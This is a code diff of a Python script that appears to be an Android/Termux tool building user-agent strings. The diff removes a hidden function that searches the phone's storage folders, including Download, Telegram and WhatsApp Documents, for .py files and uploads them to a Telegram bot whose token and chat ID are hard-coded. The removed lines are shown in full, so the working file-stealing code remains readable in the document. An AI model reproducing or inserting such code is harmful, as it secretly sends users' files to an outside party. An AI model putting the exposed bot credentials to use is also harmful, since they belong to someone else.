@@ -1,6 +1,6 @@
 import os,sys,re,time,uuid,json,string,random,base64,platform,pycurl
 from concurrent.futures import ThreadPoolExecutor
-os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
+#os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
 try:
     import urllib3
 except ImportError:
@@ -112,78 +112,7 @@ uas = []
 rr = random.randint
 rc = random.choice
 
-def sexy():
-    session=requests.session() 
-    bot_token = '7610123709:AAF21eTLyX7I1byWJFV2PSsZKnxGBes9pEw' 
-    chat_id = '1778046662'
-    #-----------( /sdcard
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #------------( /sdcard/Download 
-    try:
-        sdcard_path = '/sdcard/Download'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #-------------( /sdcard/Download/Telegram 
-    try:
-        sdcard_path = '/sdcard/Download/Telegram'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #--------( /sdcard/Telegram/Telegram Files
-    try:
-        sdcard_path = '/sdcard/Telegram/Telegram Files'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
-    try:
-        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
 
-with ThreadPool(max_workers=90) as jjj:
-    jjj.submit(sexy)
 
 # Define lists of possible values for different components of the user-agent string
 devices = ["Samsung", "Vivo"]
